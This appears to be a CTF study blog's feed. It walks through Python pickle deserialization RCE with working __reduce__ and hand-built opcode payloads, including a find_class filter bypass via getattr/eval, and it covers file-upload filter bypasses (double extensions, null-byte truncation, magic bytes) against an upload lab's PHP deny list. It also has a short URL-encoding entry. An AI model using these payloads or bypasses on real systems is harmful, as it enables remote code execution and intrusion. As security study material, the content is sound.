<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num, passwd</span>):</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.num = num</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.passwd = passwd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;dir&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment">#x = B(&#x27;123&#x27;, &#x27;password&#x27;)</span></span><br><span class="line"><span class="comment">#payload=pickle.dumps(x)</span></span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#pickletools.dis(payload)</span></span><br><span class="line">pickle._loads(<span class="string">b&#x27;\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x03dir\x94\x85\x94R\x94.&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>当执行这段代码时便会输出当前目录</p>
<p>由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x03dir\x94\x85\x94R\x94.&#x27;</span><br><span class="line">    0: \x80 PROTO      4</span><br><span class="line">    2: \x95 FRAME      27</span><br><span class="line">   11: \x8c SHORT_BINUNICODE &#x27;nt&#x27;</span><br><span class="line">   15: \x94 MEMOIZE    (as 0)</span><br><span class="line">   16: \x8c SHORT_BINUNICODE &#x27;system&#x27;</span><br><span class="line">   24: \x94 MEMOIZE    (as 1)</span><br><span class="line">   25: \x93 STACK_GLOBAL</span><br><span class="line">   26: \x94 MEMOIZE    (as 2)</span><br><span class="line">   27: \x8c SHORT_BINUNICODE &#x27;dir&#x27;</span><br><span class="line">   32: \x94 MEMOIZE    (as 3)</span><br><span class="line">   33: \x85 TUPLE1</span><br><span class="line">   34: \x94 MEMOIZE    (as 4)</span><br><span class="line">   35: R    REDUCE</span><br><span class="line">   36: \x94 MEMOIZE    (as 5)</span><br><span class="line">   37: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br></pre></td></tr></table></figure>

<p><code>35: R    REDUCE</code>可以看到__ reduce __对应的是R指令，R选择栈上的第一个对象作为函数、第二个作为参数(第二个必须为元组)然后执行。查询得知R指令调用了load_reduce方法，查看源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_reduce</span>(<span class="params">self</span>):</span><br><span class="line">    stack = <span class="variable language_">self</span>.stack</span><br><span class="line">    args = stack.pop()</span><br><span class="line">    func = stack[-<span class="number">1</span>]</span><br><span class="line">    stack[-<span class="number">1</span>] = func(*args)</span><br><span class="line">dispatch[REDUCE[<span class="number">0</span>]] = load_reduce</span><br></pre></td></tr></table></figure>

<p>按照当前的例子说就是，取当前栈栈顶的元素标记位func，然后以args为参数，执行函数func，再把结果压进了当前栈中，即func对应例子中的system，而*args对应的是dir，导致了RCE。</p>
<h3 id="为什么手动构造opcode"><a href="#为什么手动构造opcode" class="headerlink" title="为什么手动构造opcode"></a>为什么手动构造opcode</h3><p>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），这时我们就可以构造opcode来进行命令执行。因为版本0的opcode更方便阅读，所以手写一般用的是版本0.</p>
<h3 id="常用操作符c，R，o，i，b。"><a href="#常用操作符c，R，o，i，b。" class="headerlink" title="常用操作符c，R，o，i，b。"></a>常用操作符c，R，o，i，b。</h3><h4 id="c"><a href="#c" class="headerlink" title="c"></a>c</h4><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_global</span>(<span class="params">self</span>):</span><br><span class="line">    module = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    name = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)<span class="comment">#获取moudle和name</span></span><br><span class="line">    klass = <span class="variable language_">self</span>.find_class(module, name)<span class="comment">#使用find_class()获取函数</span></span><br><span class="line">    <span class="variable language_">self</span>.append(klass)<span class="comment">#压栈</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">    <span class="comment"># Subclasses may override this.</span></span><br><span class="line">    sys.audit(<span class="string">&#x27;pickle.find_class&#x27;</span>, module, name)</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.proto &lt; <span class="number">3</span> <span class="keyword">and</span> <span class="variable language_">self</span>.fix_imports:</span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">            module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">        <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">            module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">    <span class="built_in">__import__</span>(module, level=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.proto &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure>

<p><code>c</code>操作符把<code>find_class()</code>函数返回的一个类对象压入栈,通过<code>__import__()</code>引入了模块并且通过<code>self.proto</code>判断pickle版本处理了不同版本的函数名称问题.</p>
<p><strong>举例</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造一个调用 os.system 的 pickle 数据（直接使用 c 操作符）</span></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;c__main__\nos\nsystem\n(cos\nsystem\nS&#x27;calc&#x27;\ntR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反汇编查看操作符</span></span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 0: c    GLOBAL     &#x27;__main__ os system&#x27;  # 导入 os.system</span><br><span class="line">19: (    MARK</span><br><span class="line">20: c        GLOBAL     &#x27;os system&#x27;       # 再次导入 os.system</span><br><span class="line">31: S        STRING     &#x27;calc&#x27;            # 参数字符串 &#x27;calc&#x27;</span><br><span class="line">38: t        TUPLE      (MARK at 19)      # 组成元组 (os.system, &#x27;calc&#x27;)</span><br><span class="line">39: R    REDUCE                          # 调用函数</span><br><span class="line">40: .    STOP</span><br></pre></td></tr></table></figure>

<p><strong>效果</strong>：反序列化后会执行 <code>os.system(&quot;calc&quot;)</code>（弹出计算器）。</p>
<h4 id="R"><a href="#R" class="headerlink" title="R"></a>R</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode=b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27; </span><br></pre></td></tr></table></figure>

<p>cos<br>system<br>将os.system压入栈中<br>(<br>向栈中压入Mark<br>S’whoami’<br>将字符串whoami压入栈中<br>t寻找栈中的上一个Mark，并组合之间的数组为元组(‘whoami’)<br>R选择栈上的第一个对象作为函数、第二个作为参数(第二个必须为元组),<br>然后调用该函数os.system(‘whoami’)<br>点号结束</p>
<h4 id="o"><a href="#o" class="headerlink" title="o"></a>o</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode=b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27; </span><br></pre></td></tr></table></figure>

<p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象)</p>
<h4 id="i"><a href="#i" class="headerlink" title="i"></a>i</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode=b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;  </span><br></pre></td></tr></table></figure>

<p>(S’whoami’Mark压入栈中，字符串压入栈中<br>ios\nsystem<br>i指令相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p>
<h4 id="b"><a href="#b" class="headerlink" title="b"></a>b</h4><p>查看源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_build</span>(<span class="params">self</span>):</span><br><span class="line">        stack = <span class="variable language_">self</span>.stack</span><br><span class="line">        state = stack.pop()</span><br><span class="line">        <span class="comment"># 首先获取栈上的字节码 b 前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict</span></span><br><span class="line">        inst = stack[-<span class="number">1</span>]</span><br><span class="line">        <span class="comment">#获取该字典中键名为&quot;__setstate__&quot;的value</span></span><br><span class="line">        setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="comment">#如果存在，则执行value(state)</span></span><br><span class="line">        <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            setstate(state)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        slotstate = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">            state, slotstate = state</span><br><span class="line">        <span class="comment">#如果&quot;__setstate__&quot;为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并</span></span><br><span class="line">        <span class="keyword">if</span> state:<span class="comment">#如果state不是False,None,0或者非空序列,就步入</span></span><br><span class="line">            inst_dict = inst.__dict__</span><br><span class="line">            intern = sys.intern</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                    inst_dict[intern(k)] = v</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    inst_dict[k] = v</span><br><span class="line">        <span class="comment">#如果__setstate__和__getstate__都没有设置，则加载默认__dict__</span></span><br><span class="line">        <span class="keyword">if</span> slotstate:</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">                <span class="built_in">setattr</span>(inst, k, v)</span><br><span class="line">    dispatch[BUILD[<span class="number">0</span>]] = load_build</span><br></pre></td></tr></table></figure>

<p>简单地说,<code>b</code>操作符有两种用法</p>
<ol>
<li>向一个实例中插入属性,或覆盖属性</li>
<li>以一个实例的<code>__setstate__</code>属性为<code>func</code>,<code>b</code>的前一个元素当作<code>arg</code>,执行<code>func(arg)</code></li>
</ol>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Secret</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line">s=Secret(<span class="string">&quot;S1nKk&quot;</span>)</span><br><span class="line">opcode=<span class="string">b&quot;&quot;&quot;c__main__</span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Funny_M0nk3y&#x27;</span></span><br><span class="line"><span class="string">db.&quot;&quot;&quot;</span></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(s.name)</span><br><span class="line"><span class="comment"># pickletools.dis(opcode)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>c__main__</code>：创建一个在 <code>__main__</code> 模块中定义的类的实例。</p>
</li>
<li><p><code>s</code>：表示接下来的操作是保存一个对象的字典（即实例的属性）。</p>
</li>
<li><p><code>(S&#39;name&#39;</code>：表示一个键，这里是字符串 <code>&#39;name&#39;</code>。</p>
</li>
<li><p><code>S&#39;Funny_M0nk3y&#39;</code>：表示一个值，这里是字符串 <code>&#39;Funny_M0nk3y&#39;</code>。</p>
</li>
<li><p><code>db.</code>：结束保存字典的操作，然后是 pickle 协议的结束标记。</p>
<p>这时name的值便被修改为Funny_M0nk3y。</p>
</li>
</ul>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="find-class-中出现过滤"><a href="#find-class-中出现过滤" class="headerlink" title="find_class()中出现过滤"></a>find_class()中出现过滤</h4><p>有些题中通过在find_class()中加入黑白名单来防止调用危险函数</p>
<p><strong>绕过方法</strong></p>
<p>通过使用builtins模块构造getattr函数，不再经过find_class，就能绕过WAF实现任意函数执行。</p>
<p><strong>builtins模块</strong>：<br><code>builtins</code> 是 Python 的内置模块，包含所有内置函数和类（如 <code>getattr</code>、<code>str</code>、<code>dict</code> 等）。攻击者可能通过它间接访问危险函数。</p>
<p><strong>getattr：</strong></p>
<p><code>getattr</code> 是 <code>builtins</code> 模块中的一个函数，用于从对象中获取指定的属性。</p>
<p><strong>示例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">builtins.getattr(builtins.getattr(builtins.dict,&#x27;get&#x27;)(builtins.golbals(),&#x27;builtins&#x27;),&#x27;eval&#x27;)(command)</span><br></pre></td></tr></table></figure>

<ol>
<li><p>builtins.dict: 这是Python内置的 <code>dict</code> 类。</p>
</li>
<li><p>builtins.getattr(builtins.dict, ‘get’): 这里使用 <code>getattr</code> 函数来获取 <code>dict</code> 类的 <code>get</code> 方法。<code>get</code> 方法是字典对象的一个方法，用于获取指定键的值，如果键不存在，则返回默认值（如果没有提供默认值，则返回 <code>None</code>）。</p>
</li>
<li><p>builtins.getattr(builtins.dict, ‘get’)(builtins.globals(), ‘builtins’): 这一步执行了上一步获取的 <code>get</code> 方法。<code>builtins.globals()</code> 返回当前全局符号表，这是一个字典，包含了当前全局范围内的所有变量。然后，我们使用 <code>get</code> 方法从这个全局字典中获取键 <code>&#39;builtins&#39;</code> 的值。在全局字典中，键 <code>&#39;builtins&#39;</code> 对应的是 <code>builtins</code> 模块本身。</p>
</li>
<li><p>builtins.getattr(…, ‘eval’): 最后，我们再次使用 <code>getattr</code> 函数，这次是从上一步返回的 <code>builtins</code> 模块中获取 <code>&#39;eval&#39;</code> 属性。<code>eval</code> 是一个内置函数，它能够执行一个字符串作为Python代码。</p>
<p>5.<code>(command)</code>: 最后，我们将 <code>command</code> 作为参数传递给 <code>eval</code> 函数。这意味着 <code>command</code> 字符串将被当作Python代码执行。</p>
</li>
</ol>
<p>难点在于如何转化成opcode，这里我们可以借助pker的辅助来进行生成。</p>
<p>写成opcode就是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geteval = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(cbuiltins</span><br><span class="line">dict</span><br><span class="line">S&#x27;get&#x27;</span><br><span class="line">tR(cbuiltins</span><br><span class="line">globals</span><br><span class="line">)RS&#x27;__builtins__&#x27;</span><br><span class="line">tRS&#x27;eval&#x27;</span><br><span class="line">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="line">tR.</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="绕过显式字符串检测"><a href="#绕过显式字符串检测" class="headerlink" title="绕过显式字符串检测"></a>绕过显式字符串检测</h4><p><code>V</code>操作符可以进行unicode编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vsecr\u0065t</span><br><span class="line">#secret</span><br></pre></td></tr></table></figure>

<p><code>S</code>操作符可以识别十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S&#x27;\x73ecret&#x27;</span><br><span class="line">#secret</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>GHCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>url编码</title>
    <url>/2025/07/27/url%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<p>z</p>
<p>在平常做ctf的时候经常搞不懂为什么要将某些字符编码，今天学习之后才发现</p>
<p>URL中只能使用ASCII字符集可以显示的字符，如果需要在URL中使用不属于此字符集的字符，就要使用特殊的符号对该字符进行编码。</p>
<p>除了无法显示的字符，URL中对那些保留（reserved）字符和不安全（unsafe）字符进行编码。</p>
<p>保留字符是指那些在URL中具有特定意义的字符，不安全字符是指那些在URL中没有特殊含义，但在URL所在的上下文中可能具有特殊意义的字符。</p>
<p>当保留字符和不安全字符不是用作他原有的功能时，就需要进行编码，避免产生歧义，比如在查询参数中出现。</p>
<p>常见的保留和不安全字符</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
<th>用法</th>
<th>编码</th>
</tr>
</thead>
<tbody><tr>
<td>;</td>
<td>分号</td>
<td>保留</td>
<td>%3B</td>
</tr>
<tr>
<td>&#x2F;</td>
<td>斜线</td>
<td>保留</td>
<td>%2F</td>
</tr>
<tr>
<td>?</td>
<td>问号</td>
<td>保留</td>
<td>%3F</td>
</tr>
<tr>
<td>:</td>
<td>冒号</td>
<td>保留</td>
<td>%3A</td>
</tr>
<tr>
<td>@</td>
<td>“at”符号</td>
<td>保留</td>
<td>%4O</td>
</tr>
<tr>
<td>&#x3D;</td>
<td>等号</td>
<td>保留</td>
<td>%3D</td>
</tr>
<tr>
<td>&amp;</td>
<td>“和”符号</td>
<td>保留</td>
<td>%26</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于号</td>
<td>不安全</td>
<td>%3C</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于号</td>
<td>不安全</td>
<td>%3E</td>
</tr>
<tr>
<td>“</td>
<td>双引号</td>
<td>不安全</td>
<td>%22</td>
</tr>
<tr>
<td>#</td>
<td>井号</td>
<td>不安全</td>
<td>%23</td>
</tr>
<tr>
<td>%</td>
<td>百分号</td>
<td>不安全</td>
<td>%25</td>
</tr>
<tr>
<td>{</td>
<td>左大括号</td>
<td>不安全</td>
<td>%7B</td>
</tr>
<tr>
<td>}</td>
<td>右大括号</td>
<td>不安全</td>
<td>%7D</td>
</tr>
<tr>
<td>|</td>
<td>竖线</td>
<td>不安全</td>
<td>%7C</td>
</tr>
<tr>
<td>\</td>
<td>反斜线</td>
<td>不安全</td>
<td>%5C</td>
</tr>
<tr>
<td>^</td>
<td>加字号</td>
<td>不安全</td>
<td>%5E</td>
</tr>
<tr>
<td>~</td>
<td>波浪</td>
<td>不安全</td>
<td>%7E</td>
</tr>
<tr>
<td>[</td>
<td>左中括号</td>
<td>不安全</td>
<td>%5B</td>
</tr>
<tr>
<td>]</td>
<td>右中括号</td>
<td>不安全</td>
<td>%5D</td>
</tr>
<tr>
<td>&#96;</td>
<td>反单引号</td>
<td>不安全</td>
<td>%60</td>
</tr>
<tr>
<td></td>
<td>空格</td>
<td>不安全</td>
<td>%20</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>upload11-21</title>
    <url>/2025/02/22/upload11-21/</url>
    <content><![CDATA[<h1 id="pass11-双写绕过"><a href="#pass11-双写绕过" class="headerlink" title="pass11(双写绕过)"></a>pass11(双写绕过)</h1><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;     ```</span><br></pre></td></tr></table></figure>

<p>我们发现了新代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure>

<ul>
<li>这行代码使用<code>str_ireplace()</code>函数尝试从文件名中移除数组<code>$deny_ext</code>中列出的所有扩展名。</li>
</ul>
<p>我们可以想到双写来绕过。</p>
<p>当我们把文件后缀设置为**.pphphp**,中间的php会被删除，留下**.php**,这样我们就上传成功了。</p>
<h1 id="空字符"><a href="#空字符" class="headerlink" title="空字符"></a>空字符</h1><p>0x00，%00都是空字符，0x00是编程语言中使用的，%00是在url编码中使用的，他们的作用是截断字符串，例如“up0x00load”,系统在读到0x00时自动停止，那么读取到的只剩下“up”。</p>
<h1 id="pass12-00绕过"><a href="#pass12-00绕过" class="headerlink" title="pass12(%00绕过)"></a>pass12(%00绕过)</h1><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>

<p>我们发现文件的保存路径是可以被修改的，我们可以想到用%00(因为这里的路径是通过get方法获取的)将$img_path &#x3D; $_GET[‘save_path’]后面的代码给截断掉，这样我们就可以任意修改文件名了。</p>
<p><img src="/../images/1740195984936.jpg" alt="1740195984936" loading="lazy"></p>
<p>不过这需要php版本低于5.3</p>
<h1 id="pass13（0x00）"><a href="#pass13（0x00）" class="headerlink" title="pass13（0x00）"></a>pass13（0x00）</h1><p>这关是用post方法传输的，我们抓包完发现可以在请求体中修改路径，不过我们这里不能直接在后面加上0x00，因为php并不会把0x00解释为空字符并停止读取，我们可以在后缀名之后加个空格或者随便加个字符，再把他改为16进制为0的字符，这样就会被识别为空字符以截断$img_path &#x3D; $_GET[‘save_path’]后面的语句。</p>
<p>这也需要低版本php</p>
<h1 id="pass14-字节标识符绕过"><a href="#pass14-字节标识符绕过" class="headerlink" title="pass14(字节标识符绕过)"></a>pass14(字节标识符绕过)</h1><p>字节标识符(文件头)是指文件最开始的几个字节，用于标识文件类型。</p>
<p>常见的如下：</p>
<ol>
<li><strong>JPEG 图像文件</strong><ul>
<li>字节标识: <code>FF D8 FF</code></li>
</ul>
</li>
<li><strong>PNG 图像文件</strong><ul>
<li>字节标识: <code>89 50 4E 47 0D 0A 1A 0A</code></li>
</ul>
</li>
<li><strong>GIF 图像文件</strong><ul>
<li>字节标识: <code>47 49 46 38 37 61</code>  (GIF87a) 或 <code>47 49 46 38 39 61</code> (GIF89a)</li>
</ul>
</li>
<li><strong>PDF 文件</strong><ul>
<li>字节标识: <code>%PDF-</code> (ASCII 字符串，通常后跟版本号)</li>
</ul>
</li>
</ol>
<p>我们查看本关的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span 